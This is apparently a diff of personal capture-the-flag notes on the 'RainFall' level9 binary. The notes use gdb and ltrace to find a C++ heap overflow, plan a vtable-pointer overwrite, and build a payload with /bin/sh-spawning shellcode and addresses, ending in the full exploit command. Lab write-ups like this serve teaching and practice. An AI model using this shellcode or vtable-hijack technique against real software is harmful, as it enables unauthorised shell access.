@@ -36,6 +36,36 @@ Non-debugging symbols:
 
 0x0804881c  _fin
 #+end_src
+** see globals variables
+#+begin_src shell
+info variables
+All defined variables:
+
+Non-debugging symbols:
+0x08048838  _fp_hw
+0x0804883c  _IO_stdin_used
+0x08048840  vtable for N # Look like N got vtable may got some virtual method.
+0x08048850  typeinfo name for N
+0x08048854  typeinfo for N
+0x08048a44  __FRAME_END__
+0x08049a48  __init_array_start
+0x08049a4c  __CTOR_LIST__
+0x08049a4c  __init_array_end
+0x08049a50  __CTOR_END__
+0x08049a54  __DTOR_LIST__
+0x08049a58  __DTOR_END__
+0x08049a5c  __JCR_END__
+0x08049a5c  __JCR_LIST__
+0x08049a60  _DYNAMIC
+0x08049b44  _GLOBAL_OFFSET_TABLE_
+0x08049b74  __data_start
+0x08049b74  data_start
+0x08049b78  __dso_handle
+0x08049b80  _ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3
+0x08049bac  completed.6159
+0x08049bb0  dtor_idx.6161
+0x08049bb4  std::__ioinit
+#+end_src
 
 * Binary Analisis.
 ** disass functions
@@ -145,22 +175,13 @@ Non-debugging symbols:
      0x08048698 <+164>:	leave  
      0x08048699 <+165>:	ret    
 #+end_src
-* Explotation
-Need parameters.
-#+begin_src shell
-level9@RainFall:~$ ltrace ./level9 a
-__libc_start_main(0x80485f4, 2, 0xbffffcf4, 0x8048770, 0x80487e0 <unfinished ...>
-_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
-__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
-_Znwj(108, 0xbffffcf4, 0xbffffd00, 0xb7d79e55, 0xb7fed280) = 0x804a008 -> 108 size of class
-_Znwj(108, 5, 0xbffffd00, 0xb7d79e55, 0xb7fed280)      = 0x804a078 -> 5 param pass to constructor
-strlen("a")                                            = 1
-memcpy(0x0804a00c, "a", 1)                             = 0x0804a00c
-_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
-+++ exited (status 11)
-
-
-#+end_src
+*** Data got it
+**** it got some virtual function
+cause on constructor set a weird offset on the begining of the struct.
+** Source
+[[source]]
+[[https://defuse.ca/exploiting-cpp-vtables.htm]]
+** Entrypoint
 if strlen argv[1] > that object size heap overflow.
 offset = 8 + 4 = 12 bytes
 obj size = 108 bytes
@@ -179,15 +200,33 @@ Breakpoint 1 at 0x804867c
 0x804a00c:	0x41414141
 buffer_addr = 0x804a00c
 #+end_src
-## exploit
-### write on vtable next N instance
+** Explotation idea
+*** Get more data
+**** Buffer va
+#+begin_src shell
+level9@RainFall:~$ ltrace ./level9 a
+__libc_start_main(0x80485f4, 2, 0xbffffcf4, 0x8048770, 0x80487e0 <unfinished ...>
+_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
+__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
+_Znwj(108, 0xbffffcf4, 0xbffffd00, 0xb7d79e55, 0xb7fed280) = 0x804a008 -> 108 size of class
+_Znwj(108, 5, 0xbffffd00, 0xb7d79e55, 0xb7fed280)      = 0x804a078 -> 5 param pass to constructor
+strlen("a")                                            = 1
+memcpy(0x0804a00c, "a", 1)                             = 0x0804a00c
+_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
++++ exited (status 11)
+#+end_src
+*** Explotation idea
+**** write on vtable next N instance
 points to the buffer -> when deref ->  points to the shellcode -> call shellcode
 x $eax + 4
 0x804a010:	0x00000000
 shellcode_addr = address of shellcode -0x804a010
 shellcode
-### shellcode
+**** shellcode
+#+begin_src shell
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+#+end_src
+
 #+begin_src shell
    0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc> -> method
    0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
@@ -200,16 +239,19 @@ shellcode
    0x08048693 <+159>:	call   edx                      ->i need to make this a shellcode
 
 #+end_src
-#
 payload should work this way -> overwrite edx for get the shellcode when call it
 4 that i need to write the function in the following instance. this is gonna be deref two times.
 overwrite function ptr = ptr begin of payload = ptr begin shellcode -> begin
 
-             4 B       28 B        76 B        4 B
-payload : shell_addr + shellcode + padding + buffer_addr
-          [4 bytes]   [28 bytes]  [76 bytes]  [4 bytes] = 108 + 4
-                    shellcode ptr ->   shellcode                                                                           ->         padding ->  ptr to shellcode ptr
-payload
+#+begin_src shell
+               4 B       28 B        76 B        4 B
+  payload : shell_addr + shellcode + padding + buffer_addr
+            [4 bytes]   [28 bytes]  [76 bytes]  [4 bytes] = 108 + 4
+  Flow of execution
+    ptr to shellcode ptr -> shellcode ptr ->   shellcode; 
+#+end_src
+
+#+begin_src shell
 python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"' | xxd
 0000000: 10a0 0408 31c0 5068 2f2f 7368 682f 6269  ....1.Ph//shh/bi
 0000010: 6e89 e350 5389 e1b0 0bcd 8041 4141 4141  n..PS......AAAAA
@@ -218,7 +260,11 @@ python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\
 0000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
 0000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
 0000060: 4141 4141 4141 410c a004 080a            AAAAAAA.....
+#+end_src
 
+
+
+* Exploitation
 
 #+begin_src shell
  ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
